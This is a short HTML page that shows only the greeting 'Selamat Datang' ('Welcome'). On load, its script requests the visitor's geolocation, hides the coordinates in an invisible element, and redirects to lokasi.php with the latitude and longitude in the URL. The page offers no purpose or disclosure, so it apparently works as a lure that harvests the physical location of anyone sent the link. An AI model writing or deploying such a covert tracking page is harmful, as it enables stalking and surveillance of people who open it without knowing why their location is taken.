<!DOCTYPE html>
<html>
<head>
    <title>Selamat Datang</title>
</head>
 
<body>
<center>
<p>Selamat Datang</p>
 
<p id="tampilkan" style="display:none;"></p>
</center>
<script>
var view = document.getElementById("tampilkan");
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {
        view.innerHTML = "Browser not supported!";
    }
}
 function showPosition(position) {
    var lokasi = position.coords.latitude + "," + position.coords.longitude;
    view.innerHTML =  lokasi;
    window.location.href = "lokasi.php?id="+lokasi;
 }
 getLocation();
</script>
</body>
</html>